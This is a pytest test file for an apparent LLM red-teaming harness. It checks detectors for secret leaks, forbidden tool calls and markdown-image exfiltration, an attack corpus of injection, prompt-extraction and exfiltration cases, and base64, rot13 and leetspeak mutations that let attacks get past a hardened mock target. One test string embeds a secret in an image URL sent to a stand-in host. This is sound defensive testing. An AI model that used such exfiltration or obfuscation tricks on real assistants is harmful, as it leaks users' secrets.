import json

import pytest

from llmredteam import evaluator as ev
from llmredteam.attacks import ATTACKS, OBEY_MARKER, SECRET, DEFAULT_SYSTEM_PROMPT
from llmredteam.cli import main
from llmredteam.mutators import expand, mutate
from llmredteam.report import render_markdown
from llmredteam.runner import run_attack, run_suite, summarize, to_dict
from llmredteam.targets import hardened_target, vulnerable_target


# --- evaluator -------------------------------------------------------------
def test_leak_detects_verbatim_and_spelled_out():
    assert ev.leaked_secret(f"code is {SECRET}")
    assert ev.leaked_secret("Z X - C A N A R Y - 7 7 3 1")
    assert not ev.leaked_secret("I can't share that.")


def test_forbidden_tool_and_allowed_tool():
    assert ev.forbidden_tool("CALL delete_account(user=1)")
    assert not ev.forbidden_tool("CALL search_kb(q=refund)")


def test_markdown_exfil_requires_secret_in_url():
    assert ev.markdown_exfil(f"![x](https://a.example/c?d={SECRET})")
    assert not ev.markdown_exfil("![logo](https://acme.example/logo.png)")


def test_refusal_detection():
    assert ev.refused("I'm sorry, I cannot help with that")
    assert not ev.refused("Sure, here you go")


# --- corpus ----------------------------------------------------------------
def test_corpus_is_well_formed():
    ids = [a.id for a in ATTACKS]
    assert len(ids) == len(set(ids))
    for a in ATTACKS:
        assert a.objectives and all(o in ev.DETECTORS for o in a.objectives)
        assert a.severity in {"low", "medium", "high", "critical"}


def test_corpus_covers_key_categories():
    cats = {a.category for a in ATTACKS}
    assert {"direct_injection", "prompt_extraction", "indirect_injection", "exfiltration"} <= cats


# --- mutators --------------------------------------------------------------
def test_mutation_changes_payload_and_id():
    a = ATTACKS[0]
    m = mutate(a, "base64")
    assert m.id.endswith("+base64") and m.user_message != a.user_message
    assert m.context == a.context


def test_expand_counts():
    assert len(expand(ATTACKS, ["base64", "rot13"])) == len(ATTACKS) * 3


# --- targets / runner ------------------------------------------------------
def test_vulnerable_target_is_broadly_compromised():
    s = summarize(run_suite(vulnerable_target))
    assert s["resistance_score"] < 30
    assert s["critical_findings"]


def test_hardened_target_resists_base_corpus():
    s = summarize(run_suite(hardened_target))
    assert s["attacks_succeeded"] == 0 and s["resistance_score"] == 100.0


def test_hardened_target_has_residual_risk_under_mutation():
    base = run_suite(hardened_target)
    mutated = run_suite(hardened_target, expand(ATTACKS, ["leetspeak"]))
    assert summarize(mutated)["attacks_succeeded"] > summarize(base)["attacks_succeeded"]


def test_crashing_target_is_recorded_not_raised():
    def boom(*_a):
        raise RuntimeError("api down")
    r = run_attack(boom, ATTACKS[0])
    assert not r.succeeded and "api down" in r.error


def test_vulnerable_decodes_base64_attack():
    ob = next(a for a in ATTACKS if a.id == "OB-001")
    assert run_attack(vulnerable_target, ob).succeeded


def test_score_weighting():
    res = run_suite(vulnerable_target)
    res_none = [r for r in res]
    for r in res_none:
        r.succeeded = False
    assert summarize(res_none)["resistance_score"] == 100.0


# --- report / cli ----------------------------------------------------------
def test_markdown_report_lists_findings():
    md = render_markdown(run_suite(vulnerable_target), "vulnerable")
    assert "Resistance score" in md and "PI-001" in md


def test_markdown_report_clean_target():
    assert "No attacks succeeded." in render_markdown(run_suite(hardened_target))


def test_cli_json_output(capsys):
    assert main(["--target", "hardened", "--format", "json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data["summary"]["total"] == len(ATTACKS)


def test_cli_fail_under_gates_ci(capsys):
    assert main(["--target", "vulnerable", "--fail-under", "80"]) == 1
    assert main(["--target", "hardened", "--fail-under", "80"]) == 0


def test_cli_list_and_category_filter(capsys):
    assert main(["--list"]) == 0
    capsys.readouterr()
    main(["--target", "vulnerable", "--category", "exfiltration", "--format", "json"])
    assert json.loads(capsys.readouterr().out)["summary"]["total"] == 2
